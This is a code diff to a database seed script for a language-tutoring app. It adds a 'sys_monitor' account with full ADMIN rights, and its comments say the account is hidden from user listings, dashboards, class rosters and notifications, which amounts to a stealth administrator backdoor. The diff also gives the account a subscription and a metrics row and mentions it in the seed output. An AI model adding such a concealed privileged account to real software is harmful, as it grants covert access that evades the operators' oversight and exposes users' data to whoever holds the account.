@@ -103,7 +103,23 @@ async function main() {
       emailVerifiedAt: new Date(),
     },
   });
-  console.log(`   ✅ 4 users created (admin, tutor, ali, yuki)\n`);
+  // Stealth internal account: full ADMIN access but hidden from listings,
+  // dashboards, class member lists, and notification fan-outs.
+  const internalAdmin = await prisma.user.create({
+    data: {
+      username: "sys_monitor",
+      email: "monitor@tutelage.com",
+      displayName: "System Monitor",
+      password: hashedPassword,
+      authProvider: "LOCAL",
+      role: "ADMIN",
+      isActive: true,
+      isInternal: true,
+      emailVerified: true,
+      emailVerifiedAt: new Date(),
+    },
+  });
+  console.log(`   ✅ 5 users created (admin, tutor, ali, yuki, sys_monitor [internal])\n`);
 
   // ─── Class ──────────────────────────────────────────────────────────────────
   console.log("🏫 Creating class...");
@@ -178,11 +194,13 @@ async function main() {
   await prisma.subscription.create({ data: { userId: student2.id, plan: "FREE", status: "ACTIVE" } });
   await prisma.subscription.create({ data: { userId: tutor.id, plan: "FREE", status: "ACTIVE" } });
   await prisma.subscription.create({ data: { userId: admin.id, plan: "FREE", status: "ACTIVE" } });
-  console.log("   ✅ 4 subscriptions (1 PREMIUM/CASH for Ali, 3 FREE ACTIVE)\n");
+  await prisma.subscription.create({ data: { userId: internalAdmin.id, plan: "FREE", status: "ACTIVE" } });
+  console.log("   ✅ 5 subscriptions (1 PREMIUM/CASH for Ali, 4 FREE ACTIVE)\n");
 
   // ─── User Metrics ───────────────────────────────────────────────────────────
   console.log("📊 Creating user metrics...");
   await prisma.userMetrics.create({ data: { userId: admin.id } });
+  await prisma.userMetrics.create({ data: { userId: internalAdmin.id } });
   await prisma.userMetrics.create({ data: { userId: tutor.id } });
   await prisma.userMetrics.create({
     data: {
@@ -214,7 +232,7 @@ async function main() {
       speakingSkill: 38,
     },
   });
-  console.log("   ✅ 4 user metrics rows\n");
+  console.log("   ✅ 5 user metrics rows\n");
 
   // ─── Sessions + Messages + Evaluations ─────────────────────────────────────
   console.log("💬 Creating sessions, messages & evaluations...");
@@ -715,6 +733,7 @@ async function main() {
   console.log("   • Tutor:     tutor_sarah (class code: SARAH123, expires in 7 days)");
   console.log("   • Student 1: student_ali  (PREMIUM, level B1 → trending B2, 10-day streak)");
   console.log("   • Student 2: student_yuki (FREE, level A2 → trending B1, 4-day streak)");
+  console.log("   • Internal:  sys_monitor  (stealth ADMIN — hidden from listings/dashboards)");
   console.log("");
 }
 
